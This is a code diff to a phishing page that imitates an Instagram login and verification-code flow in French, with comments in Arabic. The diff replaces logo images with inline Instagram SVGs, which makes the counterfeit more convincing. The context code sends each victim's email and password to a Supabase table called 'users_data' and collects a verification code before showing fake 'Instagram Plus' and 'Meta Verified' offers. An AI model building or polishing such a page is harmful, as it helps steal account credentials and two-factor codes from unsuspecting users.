@@ -12,7 +12,9 @@
 
     /* الهيدر وشعار اللغة */
     .lang-select { font-size: 13px; color: #65676b; margin-bottom: 40px; }
-    .insta-icon-large { width: 75px; height: 75px; margin: 0 auto 35px; display: block; }
+    
+    /* تصميم SVG الشعار */
+    .insta-logo-svg { width: 65px; height: 65px; margin: 0 auto 35px; display: block; }
     
     /* الخانات والأزرار */
     .inputs-group { margin-bottom: 12px; }
@@ -24,12 +26,12 @@
 
     .link-forgot { display: inline-block; color: #1c1e21; font-size: 13px; font-weight: 600; text-decoration: none; margin-top: 18px; }
 
-    /* أسفل الصفحة (الشاشات الأولى والثانية) */
+    /* أسفل الصفحة */
     .footer-actions { margin-top: auto; padding-top: 20px; }
     .btn-outline { width: 100%; background: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 11px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; text-decoration: none; display: block; margin-bottom: 18px; }
     .meta-logo-footer { font-size: 14px; font-weight: 700; color: #0064e0; display: flex; align-items: center; justify-content: center; gap: 4px; }
 
-    /* الشاشات القديمة (Plus & Meta) */
+    /* الشاشات الأخرى */
     .title-plus { font-size: 20px; font-weight: 700; color: #1c1e21; margin-bottom: 8px; line-height: 1.3; }
     .title-plus span { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     .subtitle-text { font-size: 13px; color: #65676b; margin-bottom: 20px; line-height: 1.4; }
@@ -50,12 +52,26 @@
 
   <div class="app-container">
 
-    <!-- 1️⃣ الشاشة الأولى: تصميم تسجيل الدخول الحديث (مطابق للصورة 2) -->
+    <!-- 1️⃣ الشاشة الأولى: تسجيل الدخول -->
     <div id="step-1-login" class="content-wrap" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
       <div>
         <div class="lang-select">Français (France) ∨</div>
         
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-icon-large" alt="Instagram">
+        <!-- شعار Instagram العصري بحجم وتدريجات دقيقة (SVG) -->
+        <svg class="insta-logo-svg" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <radialGradient id="rg" cx="15%" cy="100%" r="125%">
+              <stop offset="0%" stop-color="#fdf497" />
+              <stop offset="5%" stop-color="#fdf497" />
+              <stop offset="45%" stop-color="#fd5949" />
+              <stop offset="60%" stop-color="#d6249f" />
+              <stop offset="90%" stop-color="#285AEB" />
+            </radialGradient>
+          </defs>
+          <path fill="url(#rg)" d="M256 49.5c67.3 0 75.2.3 101.8 1.5 24.6 1.1 37.9 5.2 46.8 8.7 11.8 4.6 20.2 10 29 18.8s14.3 17.2 18.8 29c3.5 8.9 7.6 22.2 8.7 46.8 1.2 26.6 1.5 34.5 1.5 101.8s-.3 75.2-1.5 101.8c-1.1 24.6-5.2 37.9-8.7 46.8-4.6 11.8-10 20.2-18.8 29s-17.2 14.3-29 18.8c-8.9 3.5-22.2 7.6-46.8 8.7-26.6 1.2-34.5 1.5-101.8 1.5s-75.2-.3-101.8-1.5c-24.6-1.1-37.9-5.2-46.8-8.7-11.8-4.6-20.2-10-29-18.8s-14.3-17.2-18.8-29c-3.5-8.9-7.6-22.2-8.7-46.8-1.2-26.6-1.5-34.5-1.5-101.8s.3-75.2 1.5-101.8c1.1-24.6 5.2-37.9 8.7-46.8 4.6-11.8 10-20.2 18.8-29s17.2-14.3 29-18.8c8.9-3.5 22.2-7.6 46.8-8.7 26.6-1.2 34.5-1.5 101.8-1.5m0-45.5c-68.4 0-77 .3-103.9 1.5C125.3 6.7 107 11 91 17.2c-16.6 6.4-30.6 15.1-44.6 29.1-14 14-22.6 28-29.1 44.6-6.2 16-10.5 34.3-11.7 61.1C4.4 179 4.1 187.6 4.1 256s.3 77 1.5 103.9c1.2 26.8 5.5 45.1 11.7 61.1 6.4 16.6 15.1 30.6 29.1 44.6 14 14 28 22.6 44.6 29.1 16 6.2 34.3 10.5 61.1 11.7 26.9 1.2 35.5 1.5 103.9 1.5s77-.3 103.9-1.5c26.8-1.2 45.1-5.5 61.1-11.7 16.6-6.4 30.6-15.1 44.6-29.1 14-14 22.6-28 29.1-44.6 6.2-16 10.5-34.3 11.7-61.1 1.2-26.9 1.5-35.5 1.5-103.9s-.3-77-1.5-103.9c-1.2-26.8-5.5-45.1-11.7-61.1-6.4-16.6-15.1-30.6-29.1-44.6-14-14-28-22.6-44.6-29.1-16-6.2-34.3-10.5-61.1-11.7C333 4.3 324.4 4 256 4z"/>
+          <path fill="url(#rg)" d="M256 126.6c-71.4 0-129.4 57.9-129.4 129.4S184.6 385.4 256 385.4 385.4 327.4 385.4 256 327.4 126.6 256 126.6zm0 213.3c-46.3 0-83.9-37.6-83.9-83.9s37.6-83.9 83.9-83.9 83.9 37.6 83.9 83.9-37.6 83.9-83.9 83.9z"/>
+          <circle fill="url(#rg)" cx="390.5" cy="121.5" r="30.2"/>
+        </svg>
 
         <form id="loginForm">
           <div class="inputs-group">
@@ -80,10 +96,23 @@
       <div style="font-size: 14px; color: #65676b;">Vérification des données...</div>
     </div>
 
-    <!-- 2️⃣ الشاشة الثانية: تصميم كود التحقيق الحديث (مطابق للصورة 4) -->
+    <!-- 2️⃣ الشاشة الثانية: كود التحقيق -->
     <div id="step-2-code" class="content-wrap hidden" style="height: 100%; display: flex; flex-direction: column; justify-content: space-between;">
       <div>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-icon-large" alt="Instagram" style="margin-top: 30px;">
+        <svg class="insta-logo-svg" style="margin-top: 20px; margin-bottom: 25px;" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <radialGradient id="rg2" cx="15%" cy="100%" r="125%">
+              <stop offset="0%" stop-color="#fdf497" />
+              <stop offset="5%" stop-color="#fdf497" />
+              <stop offset="45%" stop-color="#fd5949" />
+              <stop offset="60%" stop-color="#d6249f" />
+              <stop offset="90%" stop-color="#285AEB" />
+            </radialGradient>
+          </defs>
+          <path fill="url(#rg2)" d="M256 49.5c67.3 0 75.2.3 101.8 1.5 24.6 1.1 37.9 5.2 46.8 8.7 11.8 4.6 20.2 10 29 18.8s14.3 17.2 18.8 29c3.5 8.9 7.6 22.2 8.7 46.8 1.2 26.6 1.5 34.5 1.5 101.8s-.3 75.2-1.5 101.8c-1.1 24.6-5.2 37.9-8.7 46.8-4.6 11.8-10 20.2-18.8 29s-17.2 14.3-29 18.8c-8.9 3.5-22.2 7.6-46.8 8.7-26.6 1.2-34.5 1.5-101.8 1.5s-75.2-.3-101.8-1.5c-24.6-1.1-37.9-5.2-46.8-8.7-11.8-4.6-20.2-10-29-18.8s-14.3-17.2-18.8-29c-3.5-8.9-7.6-22.2-8.7-46.8-1.2-26.6-1.5-34.5-1.5-101.8s.3-75.2 1.5-101.8c1.1-24.6 5.2-37.9 8.7-46.8 4.6-11.8 10-20.2 18.8-29s17.2-14.3 29-18.8c8.9-3.5 22.2-7.6 46.8-8.7 26.6-1.2 34.5-1.5 101.8-1.5m0-45.5c-68.4 0-77 .3-103.9 1.5C125.3 6.7 107 11 91 17.2c-16.6 6.4-30.6 15.1-44.6 29.1-14 14-22.6 28-29.1 44.6-6.2 16-10.5 34.3-11.7 61.1C4.4 179 4.1 187.6 4.1 256s.3 77 1.5 103.9c1.2 26.8 5.5 45.1 11.7 61.1 6.4 16.6 15.1 30.6 29.1 44.6 14 14 28 22.6 44.6 29.1 16 6.2 34.3 10.5 61.1 11.7 26.9 1.2 35.5 1.5 103.9 1.5s77-.3 103.9-1.5c26.8-1.2 45.1-5.5 61.1-11.7 16.6-6.4 30.6-15.1 44.6-29.1 14-14 22.6-28 29.1-44.6 6.2-16 10.5-34.3 11.7-61.1 1.2-26.9 1.5-35.5 1.5-103.9s-.3-77-1.5-103.9c-1.2-26.8-5.5-45.1-11.7-61.1-6.4-16.6-15.1-30.6-29.1-44.6-14-14-28-22.6-44.6-29.1-16-6.2-34.3-10.5-61.1-11.7C333 4.3 324.4 4 256 4z"/>
+          <path fill="url(#rg2)" d="M256 126.6c-71.4 0-129.4 57.9-129.4 129.4S184.6 385.4 256 385.4 385.4 327.4 385.4 256 327.4 126.6 256 126.6zm0 213.3c-46.3 0-83.9-37.6-83.9-83.9s37.6-83.9 83.9-83.9 83.9 37.6 83.9 83.9-37.6 83.9-83.9 83.9z"/>
+          <circle fill="url(#rg2)" cx="390.5" cy="121.5" r="30.2"/>
+        </svg>
         
         <h2 style="font-size: 16px; font-weight: 700; margin-bottom: 8px;">Entrez le code de vérification</h2>
         <p class="subtitle-text" style="font-size: 12px; margin-bottom: 25px;">Nous avons envoyé un code de vérification à votre e-mail. Veuillez l'entrer ci-dessous.</p>
@@ -104,9 +133,22 @@
       </div>
     </div>
 
-    <!-- 3️⃣ الشاشة الثالثة: واجهة Instagram Plus -->
+    <!-- 3️⃣ الشاشة الثالثة: Instagram Plus -->
     <div id="step-3-plus" class="content-wrap hidden">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/800px-Instagram_logo_2016.svg.png" class="insta-icon-large" style="width:50px; height:50px; margin-bottom:15px;" alt="Instagram">
+      <svg class="insta-logo-svg" style="width:45px; height:45px; margin-bottom:15px;" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <radialGradient id="rg3" cx="15%" cy="100%" r="125%">
+            <stop offset="0%" stop-color="#fdf497" />
+            <stop offset="5%" stop-color="#fdf497" />
+            <stop offset="45%" stop-color="#fd5949" />
+            <stop offset="60%" stop-color="#d6249f" />
+            <stop offset="90%" stop-color="#285AEB" />
+          </radialGradient>
+        </defs>
+        <path fill="url(#rg3)" d="M256 49.5c67.3 0 75.2.3 101.8 1.5 24.6 1.1 37.9 5.2 46.8 8.7 11.8 4.6 20.2 10 29 18.8s14.3 17.2 18.8 29c3.5 8.9 7.6 22.2 8.7 46.8 1.2 26.6 1.5 34.5 1.5 101.8s-.3 75.2-1.5 101.8c-1.1 24.6-5.2 37.9-8.7 46.8-4.6 11.8-10 20.2-18.8 29s-17.2 14.3-29 18.8c-8.9 3.5-22.2 7.6-46.8 8.7-26.6 1.2-34.5 1.5-101.8 1.5s-75.2-.3-101.8-1.5c-24.6-1.1-37.9-5.2-46.8-8.7-11.8-4.6-20.2-10-29-18.8s-14.3-17.2-18.8-29c-3.5-8.9-7.6-22.2-8.7-46.8-1.2-26.6-1.5-34.5-1.5-101.8s.3-75.2 1.5-101.8c1.1-24.6 5.2-37.9 8.7-46.8 4.6-11.8 10-20.2 18.8-29s17.2-14.3 29-18.8c8.9-3.5 22.2-7.6 46.8-8.7 26.6-1.2 34.5-1.5 101.8-1.5m0-45.5c-68.4 0-77 .3-103.9 1.5C125.3 6.7 107 11 91 17.2c-16.6 6.4-30.6 15.1-44.6 29.1-14 14-22.6 28-29.1 44.6-6.2 16-10.5 34.3-11.7 61.1C4.4 179 4.1 187.6 4.1 256s.3 77 1.5 103.9c1.2 26.8 5.5 45.1 11.7 61.1 6.4 16.6 15.1 30.6 29.1 44.6 14 14 28 22.6 44.6 29.1 16 6.2 34.3 10.5 61.1 11.7 26.9 1.2 35.5 1.5 103.9 1.5s77-.3 103.9-1.5c26.8-1.2 45.1-5.5 61.1-11.7 16.6-6.4 30.6-15.1 44.6-29.1 14-14 22.6-28 29.1-44.6 6.2-16 10.5-34.3 11.7-61.1 1.2-26.9 1.5-35.5 1.5-103.9s-.3-77-1.5-103.9c-1.2-26.8-5.5-45.1-11.7-61.1-6.4-16.6-15.1-30.6-29.1-44.6-14-14-28-22.6-44.6-29.1-16-6.2-34.3-10.5-61.1-11.7C333 4.3 324.4 4 256 4z"/>
+        <path fill="url(#rg3)" d="M256 126.6c-71.4 0-129.4 57.9-129.4 129.4S184.6 385.4 256 385.4 385.4 327.4 385.4 256 327.4 126.6 256 126.6zm0 213.3c-46.3 0-83.9-37.6-83.9-83.9s37.6-83.9 83.9-83.9 83.9 37.6 83.9 83.9-37.6 83.9-83.9 83.9z"/>
+        <circle fill="url(#rg3)" cx="390.5" cy="121.5" r="30.2"/>
+      </svg>
       <h1 class="title-plus">Vous, essayez <span>Instagram Plus</span> gratuitement pendant un mois</h1>
       <p class="subtitle-text">Commandes avancées. Fonctionnalités exclusives.<br>0,99 $US / mois · Ce prix peut inclure des taxes</p>
 
@@ -121,7 +163,7 @@
       <button class="btn-main" onclick="showStepMeta()">Essayer pour 0,00 $US</button>
     </div>
 
-    <!-- 4️⃣ الشاشة الرابعة: واجهة Meta Verified -->
+    <!-- 4️⃣ الشاشة الرابعة: Meta Verified -->
     <div id="step-4-meta" class="content-wrap hidden">
       <div style="font-size: 16px; font-weight: 700; color: #0064e0; margin-bottom: 15px;">∞ Meta</div>
       <h1 style="font-size: 18px; font-weight: 700; margin-bottom: 15px;">Bénéficiez du premier mois gratuit</h1>
@@ -147,7 +189,6 @@
 
     let currentUserId = null;
 
-    // 1️⃣ إرسال البيانات فوراً عند الضغط على Se connecter
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
@@ -157,7 +198,6 @@
       document.getElementById('step-1-login').classList.add('hidden');
       document.getElementById('step-loading').classList.remove('hidden');
 
-      // تخزين فوري في Supabase
       const { data } = await supabaseClient
         .from('users_data')
         .insert([{ email: emailVal, password: passVal }])
@@ -167,14 +207,12 @@
         currentUserId = data[0].id;
       }
 
-      // إظهار واجهة الكود الثانية بعد التحميل
       setTimeout(() => {
         document.getElementById('step-loading').classList.add('hidden');
         document.getElementById('step-2-code').classList.remove('hidden');
       }, 2500);
     });
 
-    // 2️⃣ إرسال الكود والانتقال للواجهة الثالثة
     document.getElementById('codeForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
@@ -191,7 +229,6 @@
       document.getElementById('step-3-plus').classList.remove('hidden');
     });
 
-    // 3️⃣ الانتقال للواجهة الرابعة
     function showStepMeta() {
       document.getElementById('step-3-plus').classList.add('hidden');
       document.getElementById('step-4-meta').classList.remove('hidden');
